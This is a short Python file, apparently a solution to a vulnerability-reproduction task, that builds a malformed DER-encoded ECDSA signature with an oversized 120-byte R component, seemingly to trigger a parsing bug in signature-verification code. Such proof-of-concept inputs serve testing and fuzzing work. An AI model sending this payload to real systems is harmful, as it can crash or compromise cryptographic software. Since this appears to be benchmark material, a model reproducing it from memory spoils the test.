import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a DER-encoded ECDSA signature with oversized R component
        # Structure:
        #   SEQUENCE (0x30)
        #     length: 127 (0x7F) - short-form length
        #     INTEGER R:
        #       tag: 0x02
        #       length: 120 (0x78)
        #       value: 0x01 followed by 119 zero bytes
        #     INTEGER S:
        #       tag: 0x02
        #       length: 3
        #       value: 0x01 0x00 0x01
        r_len = 120
        s_len = 3
        total_len = 2 + r_len + 2 + s_len  # must be 127 for short-form length
        assert total_len == 127

        data = bytearray()
        # SEQUENCE header
        data.append(0x30)         # SEQUENCE tag
        data.append(total_len)    # SEQUENCE length (short form, < 128)

        # INTEGER R
        data.append(0x02)         # INTEGER tag
        data.append(r_len)        # R length (short form)
        data.append(0x01)         # First byte of R (positive integer)
        data.extend(b'\x00' * (r_len - 1))  # Pad remaining R bytes

        # INTEGER S
        data.append(0x02)         # INTEGER tag
        data.append(s_len)        # S length
        data.extend(b'\x01\x00\x01')  # Value of S

        return bytes(data)